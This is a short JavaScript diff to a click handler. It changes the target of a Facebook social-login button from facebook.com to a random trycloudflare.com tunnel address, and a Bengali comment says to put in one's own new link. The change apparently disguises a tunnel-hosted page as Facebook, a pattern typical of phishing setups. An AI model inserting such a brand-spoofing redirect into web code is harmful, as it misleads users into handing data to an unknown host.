@@ -18,7 +18,8 @@ document.querySelectorAll('.btn-social').forEach(button => {
         
         if (provider.toLowerCase().includes('facebook')) {
             event.preventDefault();
-            window.location.href = 'https://www.facebook.com';
+            // এখানে আপনার নতুন ওয়েবসাইট লিংকটি দিন
+            window.location.href = 'https://honest-investor-appropriate-voluntary.trycloudflare.com';
         }
     });
 });
